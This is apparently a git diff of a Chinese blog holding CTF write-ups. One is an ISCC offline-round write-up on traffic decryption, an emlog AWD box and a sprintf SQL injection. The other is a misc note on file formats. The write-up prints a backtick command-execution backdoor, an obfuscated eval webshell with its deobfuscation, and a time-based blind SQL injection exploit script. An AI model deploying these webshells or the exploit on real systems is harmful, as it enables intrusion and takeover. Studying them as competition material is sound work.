@@ -165,11 +165,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">xxx</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
 <p>然后构造脚本解密</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcp.stream eq 128 and secret file</span></span><br><span class="line">files = [<span class="string">'a.pub'</span>, <span class="string">'a.pri'</span>, <span class="string">'b.pub'</span>, <span class="string">'b.pri'</span>]</span><br><span class="line">lst = &#123;</span><br><span class="line">    <span class="string">'a.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'a.pri'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pri'</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># load rsa key</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">with</span> open(f, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">'pub'</span>):</span><br><span class="line">            lst[f] = rsa.PublicKey.load_pkcs1(fp.read().encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lst[f] = rsa.PrivateKey.load_pkcs1(fp.read().encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt messages from wireshark tcp.stream eq 128</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> sender == <span class="string">'A'</span>:</span><br><span class="line">                plain_text = rsa.decrypt(content, lst[<span class="string">'a.pri'</span>])</span><br><span class="line">        <span class="keyword">elif</span> sender == <span class="string">'B'</span>:</span><br><span class="line">                plain_text = rsa.decrypt(content, lst[<span class="string">'b.pri'</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br></pre></td></tr></table></figure>
-<p><img src alt="1-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/1-1.png" alt="1-1"></p>
 <p>用私钥是能够成功解密的，但解密了一半抛异常，观察了一下解密出的信息，发现是一个类似握手的过程，其中确定了后续传输的加密方式为 <code>AES256 ECB</code> 模式以及传输秘钥 key</p>
 <p>key的长度是 32，符合 AES256 的要求，于是改了一下脚本，后续用 AES256 ECB 继续解密，得到所有传输的明文，脚本如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcp.stream eq 128 and secret file</span></span><br><span class="line">files = [<span class="string">'a.pub'</span>, <span class="string">'a.pri'</span>, <span class="string">'b.pub'</span>, <span class="string">'b.pri'</span>]</span><br><span class="line"></span><br><span class="line">lst = &#123;</span><br><span class="line">    <span class="string">'a.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'a.pri'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pri'</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># load rsa key</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">with</span> open(f, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">'pub'</span>):</span><br><span class="line">            lst[f] = rsa.PublicKey.load_pkcs1(fp.read().encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lst[f] = rsa.PrivateKey.load_pkcs1(fp.read().encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt messages</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> sender == <span class="string">'A'</span>:</span><br><span class="line">                    plain_text = rsa.decrypt(content, lst[<span class="string">'a.pri'</span>])</span><br><span class="line">            <span class="keyword">elif</span> sender == <span class="string">'B'</span>:</span><br><span class="line">                    plain_text = rsa.decrypt(content, lst[<span class="string">'b.pri'</span>])</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get AES256 ECB KEY = CZS3MgDiippCb67ojMpFRnPu9FfLvIn6</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'CZS3MgDiippCb67ojMpFRnPu9FfLvIn6'</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./ecb_messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        plain_text = aes.decrypt(content)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br></pre></td></tr></table></figure>
-<p><img src alt="1-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/1-2.png" alt="1-2"></p>
 <h2 id="AWD私地"><a href="#AWD私地" class="headerlink" title="AWD私地"></a>AWD私地</h2><p>本次比赛私地的使用的cms是<code>emblog 5.3.1</code></p>
 <p>我们的队伍只发现一个getshell的点，但是却需要进入后台利用。当发现时，几乎所有队伍都已经进入后台并改掉了密码，也没找到其他前台的漏洞，所以本次比赛并没有拿进攻分数。但是上的<code>Firewall</code>效果不错，防守分数并没有被扣掉太多。</p>
 <h3 id="1-文件上传getshell"><a href="#1-文件上传getshell" class="headerlink" title="1. 文件上传getshell"></a>1. 文件上传getshell</h3><p>前台没有找到其他漏洞，最后根据提示的<code>isccadmin</code>作为用户名，爆破拿到的密码是<code>passw0rd</code>。从后来的情况来看，所有队伍都做到了这一步，进入后台，修改了密码</p>
@@ -180,10 +180,10 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rsd=$_GET[<span class="string">'rsd'</span>];</span><br><span class="line"><span class="keyword">echo</span> `$rsd`;</span><br></pre></td></tr></table></figure>
 <p>在php中，<code>反斜杠</code>可以用于快速执行cmd的代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rsd=chdir</span><br></pre></td></tr></table></figure>
-<p><img src alt="2-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/2-1.png" alt="2-1"></p>
 <p>随便写个python测试，也可以直接执行</p>
 <p>比赛中就直接用这个方法去运行getflag程序，这样就无需再进入后台</p>
-<p><img src alt="2-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/2-2.png" alt="2-2"></p>
 <h3 id="3-代码混淆"><a href="#3-代码混淆" class="headerlink" title="3.  代码混淆"></a>3.  代码混淆</h3><p>在<code>include\model\log_model.php</code>的开头</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o=<span class="string">'n();$r=@bas&#125;&gt;&#125;&gt;e64_encode(@x(&#125;&gt;@gzc&#125;&gt;o&#125;&gt;mpress($o),$&#125;&gt;k));p&#125;&gt;rint("&#125;&gt;$p$kh&#125;&gt;$r$kf");&#125;'</span>;</span><br><span class="line">$g=<span class="string">'&gt;EgwZ7H&#125;&gt;iEecl&#125;&gt;S";function &#125;&gt;x($t,$&#125;&gt;k)&#123;$&#125;&gt;&#125;&gt;c=s&#125;&gt;trlen(&#125;&gt;$k)&#125;&gt;;$l=strlen($t);$o="'</span>;</span><br><span class="line">$l=<span class="string">'";&#125;&gt;f&#125;&gt;or($i=0;$&#125;&gt;&#125;&gt;i&lt;$l;)&#123;for($&#125;&gt;j=&#125;&gt;0;&#125;&gt;&#125;&gt;($j&lt;$c&amp;&amp;$i&lt;$l&#125;&gt;);$j++,$i++)&#123;$o.&#125;&gt;&#125;&gt;=$'</span>;</span><br><span class="line">$r=<span class="string">'_contents&#125;&gt;("p&#125;&gt;&#125;&gt;hp://i&#125;&gt;nput")&#125;&gt;,$m)==1)&#123;@ob_star&#125;&gt;t(&#125;&gt;);@&#125;&gt;eva&#125;&gt;l(@gzu&#125;&gt;ncompress('</span>;</span><br><span class="line">$L=<span class="string">'$k="5ac&#125;&gt;91f7&#125;&gt;d";$&#125;&gt;kh=&#125;&gt;&#125;&gt;"b9615a29&#125;&gt;bc1d";&#125;&gt;$kf="24d0b67&#125;&gt;c2c91";$p&#125;&gt;="9GmI&#125;&gt;&#125;'</span>;</span><br><span class="line">$s=str_replace(<span class="string">'C'</span>,<span class="string">''</span>,<span class="string">'cCreaCteC_fCuCCnction'</span>);</span><br><span class="line">$Z=<span class="string">'t&#123;$i&#125;^&#125;&gt;$k&#123;$&#125;&gt;j&#125;&gt;&#125;;&#125;&#125;ret&#125;&gt;urn $o;&#125;&#125;&gt;if(@preg_match&#125;&gt;&#125;&gt;("&#125;&gt;/$kh(.+&#125;&gt;)$kf&#125;&gt;/",@file_&#125;&gt;get'</span>;</span><br><span class="line">$h=<span class="string">'@x(@ba&#125;&gt;se64&#125;&gt;_d&#125;&gt;ecode($m[1])&#125;&gt;,$&#125;&gt;&#125;&gt;k)))&#125;&gt;;&#125;&gt;$o=@&#125;&gt;ob_get_contents();@ob_&#125;&gt;en&#125;&gt;d_cl&#125;&gt;ea'</span>;</span><br><span class="line">$q=str_replace(<span class="string">'&#125;&gt;'</span>,<span class="string">''</span>,$L.$g.$l.$Z.$r.$h.$o);</span><br><span class="line">$I=$s(<span class="string">''</span>,$q);$I();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>打印<code>$s</code>和<code>$q</code></p>
@@ -201,12 +201,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$k=<span class="string">"5ac91f7d"</span>;</span><br><span class="line">$kh=<span class="string">"b9615a29bc1d"</span>;</span><br><span class="line">$kf=<span class="string">"24d0b67c2c91"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phpinfo_str = @base64_encode(@x(@gzcompress(<span class="string">"phpinfo();"</span>),$k));</span><br><span class="line"><span class="keyword">echo</span> $kh.$phpinfo_str.$kf;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>运行结果为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b9615a29bc1dTf1I8Rmu+y/+trONN2YioDbg24d0b67c2c91</span><br></pre></td></tr></table></figure>
-<p><img src alt="4-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-1.png" alt="4-1"></p>
 <p>但是直接提交的话，显示的是<code>@base64_encode(@x(@gzcompress($o),$k))</code>处理的内容</p>
-<p><img src alt="4-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-2.png" alt="4-2"></p>
 <p>我们直接将 <code>print(&quot;$p$kh$r$kf&quot;);</code>替换为<code>echo @base64_decode(@x(@gzuncompress($r),$k));</code></p>
 <p>再次<code>POST</code>就成功了</p>
-<p><img src alt="4-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/4-3.png" alt="4-3"></p>
 <h2 id="AWD高地"><a href="#AWD高地" class="headerlink" title="AWD高地"></a>AWD高地</h2><p>题目简化代码如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"security"</span>);</span><br><span class="line">$Profile = sprintf(<span class="string">"password = '%s'"</span>, mysqli_real_escape_string($mysqli, $_GET[<span class="string">'profile'</span>]));</span><br><span class="line">$sql = sprintf(<span class="string">"update users set $Profile where username='%s'"</span>, mysqli_real_escape_string($mysqli, <span class="string">'Dumb'</span>));</span><br><span class="line">var_dump($sql);</span><br><span class="line">$result = $mysqli-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result===<span class="keyword">True</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1 style='color:red;'&gt;$mysqli-&gt;error&lt;/h1&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>题目考查的是<code>sprintf()格式化字符串漏洞</code>，详解：<a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41185953/article/details/80485075</a></p>
@@ -219,7 +219,7 @@
 <p>经过第二个<code>sprintf()</code>处理后，<code>$sql</code>字符串变量的值为</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">拼接后：</span><br><span class="line">update users set password = &apos;%1$\&apos;&apos; where username=&apos;Dumb&apos;</span><br><span class="line">这里的%1$\会被吃掉，所以还有一个传入的单引号没有被处理，逃逸出来</span><br><span class="line">处理后：</span><br><span class="line">update users set password = &apos;&apos;&apos; where username=&apos;Dumb&apos;</span><br></pre></td></tr></table></figure>
 <p>所以就造成了注入，比如可以这样构造：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?profile = %1$\&apos; where username=&apos;admin&apos; #</span><br><span class="line">	↓		↓		↓		↓		↓</span><br><span class="line">$Profile = password = &apos;%1$\&apos; where username=&apos;admin&apos; #&apos;</span><br><span class="line">	↓		↓		↓		↓		↓</span><br><span class="line">$sql = update users set password = &apos;%1$\&apos; where username=&apos;admin&apos; #&apos; where username=&apos;Dumb&apos;</span><br><span class="line">	↓		↓		↓		↓		↓</span><br><span class="line">$sql = update users set password = &apos;&apos; where username=&apos;admin&apos; #&apos; where username=&apos;Dumb&apos;</span><br><span class="line">#修改admin用户的密码为空</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?profile = %1$\&apos; where username=&apos;admin&apos; #</span><br><span class="line">	↓</span><br><span class="line">$Profile = password = &apos;%1$\&apos; where username=&apos;admin&apos; #&apos;</span><br><span class="line">	↓</span><br><span class="line">$sql = update users set password = &apos;%1$\&apos; where username=&apos;admin&apos; #&apos; where username=&apos;Dumb&apos;</span><br><span class="line">	↓</span><br><span class="line">$sql = update users set password = &apos;&apos; where username=&apos;admin&apos; #&apos; where username=&apos;Dumb&apos;</span><br><span class="line">#修改admin用户的密码为空</span><br></pre></td></tr></table></figure>
 <p>本题exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlinject</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">			sql=<span class="string">f"http://127.0.0.1/test.php?profile=%1$\' where username=0x44756d62 and if(ascii(substr((database()),<span class="subst">&#123;j&#125;</span>,1))=<span class="subst">&#123;i&#125;</span>,sleep(1),0)--+"</span></span><br><span class="line">			ss=time.time()</span><br><span class="line">			res=requests.get(sql)</span><br><span class="line">			<span class="keyword">if</span> time.time()-ss&gt;=<span class="number">0.5</span>:</span><br><span class="line">				<span class="comment">#print(sql)</span></span><br><span class="line">				print(chr(i))</span><br><span class="line"><span class="keyword">if</span> <span class="string">'__main__'</span>==__name__:</span><br><span class="line">	sqlinject()</span><br></pre></td></tr></table></figure>
 
@@ -1034,6 +1034,214 @@
 
 
   
+    <article id="post-BugKuCTF—杂项题中常见的文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/" class="archive-article-date">
+  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF E0</span><br><span class="line"></span><br><span class="line">PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82</span><br><span class="line"></span><br><span class="line">7z：37 7A BC AF 27 1C</span><br><span class="line"></span><br><span class="line">GIF (gif)：47 49 46 38 39 61</span><br><span class="line"></span><br><span class="line">ZIP Archive (zip)：50 4B 03 04</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)：52 61 72 21</span><br><span class="line"></span><br><span class="line">Wave (wav)：57 41 56 45</span><br><span class="line"></span><br><span class="line">AVI (avi)：41 56 49 20</span><br><span class="line"></span><br><span class="line">Real Audio (ram)：2E 72 61 FD</span><br><span class="line"></span><br><span class="line">Real Media (rm)：2E 52 4D 46</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 BA</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 B3</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="修改图片的高度和宽度"><a href="#修改图片的高度和宽度" class="headerlink" title="修改图片的高度和宽度"></a>修改图片的高度和宽度</h3><h4 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h4><p>涉及题目：杂项题第三题</p>
+<p>图片格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，</span><br><span class="line"></span><br><span class="line">（可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line"></span><br><span class="line">（可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到</span><br></pre></td></tr></table></figure>
+<p>所以，撇掉前16个字节（第一行）后，修改第17-20字节为修改高度，修改第21-24字节为修改宽度</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-3.png" alt></p>
+<h4 id="JPEG图片"><a href="#JPEG图片" class="headerlink" title="JPEG图片"></a>JPEG图片</h4><p>涉及题目：杂项题第二十九题</p>
+<p>图片格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FFD8：图片起始标示位</span><br><span class="line">FFC0：SOFO，Start of Frame，帧图像开始，修改高度宽度应注意的标示位</span><br><span class="line">FFD9：图片结束标识位</span><br></pre></td></tr></table></figure>
+<p>JPEG（JPG）图片的高度和宽度的位置不像PNG图片那样是固定的</p>
+<p>而是根据图片的不同而不同位置，但是却也有规律可以找</p>
+<p>修改JPG图片的高度和宽度要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度。但要注意的是也有图片需要找0xFFC2，就像第二十九题</p>
+<p>所以使用winhex的情况下，搜索Hex值（Ctrl+Alt+X）：FFC0或FFC2，一般位置比较靠前</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-7.png" alt></p>
+<p>标示位往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度</p>
+<p>如下图：66是高度，781是宽度，和图片属性里面的一样</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-8.png" alt></p>
+<hr>
+<h3 id="压缩文件伪加密"><a href="#压缩文件伪加密" class="headerlink" title="压缩文件伪加密"></a>压缩文件伪加密</h3><h4 id="ZIP文件"><a href="#ZIP文件" class="headerlink" title="ZIP文件"></a>ZIP文件</h4><p>讲到伪加密，需要对ZIP文件的格式加上一些的补充：</p>
+<p>一格zip文件有三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</p>
